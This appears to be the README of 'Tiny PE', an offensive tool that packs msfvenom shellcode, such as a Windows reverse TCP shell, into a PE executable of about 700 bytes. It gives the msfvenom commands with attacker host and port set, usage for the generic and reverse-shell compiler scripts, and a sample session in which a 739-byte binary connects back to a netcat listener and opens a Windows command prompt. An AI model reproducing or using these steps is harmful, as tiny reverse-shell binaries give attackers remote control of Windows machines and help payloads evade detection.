# Tiny PE

Small PE reverse shell generator.
Generates a very small (~700 bytes) reverse shells/shellcodes/payloads packed into .exe PE file.


## General presentation

Typical executable payloads generated by msfvenom are about 70kb, and even packed with tools
such as UPX they remain at around 48kb, at least at the time I started this project.

However in some situation, it is interesting to have a PE executable file as small as possible.

This tools leverages on [some research](ttp://www.phreedom.org/research/tinype/) (done by others and found on internet) about generating
the smallest PE file as possible.
The original project was about downloading and executing a payload through webdav.

I just weaponized this research into a tool that integrates an arbitrary shellcode 
typically generated by msfvenom, into these small PE files.

As an example, it is possible to obtain a reverse shell PE executable file of 681 bytes from
a msfvenom `windows/shell_reverse_tcp`, wich is 2 orders of magnitude below a typical PE generated directly by msfvenom.

### Stability

The executables I obtained seem to work quite well, but I had a few times where it didn't work.
If it doesn't work on the first try, it's worth trying a couple more times.


## Generic shellcode compiler

This tool "packs" a generic shellcode (typically generated by msfvenom) into a .exe PE file.
The produced executable will typically be around 700 bytes long.

### Usage

```
./generic-compiler.sh <MASM_SHELLCODE> <OUTPUT_EXE_FILE>
```

Arguments:
- `MASM_SHELLCODE`  : Shellcode in MASM format
                   Typically generated with msfvenom with a command of the form
                   `msfvenom -p windows/<PAYLOAD> <OPTIONS> -f masm -o shellcode.asm`
- `OUTPUT_EXE_FILE`  : Ouput filename for PE .exe file

### Example

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.11 LPORT=4444 -f masm -o shellcode.asm
./generic-compiler.sh shellcode.asm shellcode.exe
```


## Revshell-compiler 

This tool was the first version of this project.
A hardcoded reverse shell is in the ASM source and the compiler script just replace
the `LHOST` and `LPORT` parameters by those supplied by the user.

It is here for "historical" reasons and does not have a a great interest compared to 
the generic shellcode compiler presented above, unless you have no msfvenom or reverse shell 
source code at hand.

### Usage

```
revshell-compiler.sh <OUTPUTFILE> <LHOST> <LPORT
```
Arguments:
- `OUTPUTFILE` : .exe output file
- `LHOST` : Attacker IP address to receive reverse shell
- `LPORT` : Listening port to receive reverse shell

### Example

```
$ ./revshell-compiler.sh rs.exe 172.16.19.247 5432
Compiling template for 172.16.19.247:5432 to rs.asm.
0x38150002 0xf71310ac
PE reverse shell exported to rs.exe.
Size: 739 bytes.

$ nc -nlvp 5432
listening on [any] 5432 ...
connect to [172.16.19.247] from (UNKNOWN) [172.16.19.244] 62455
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\tinype>
```
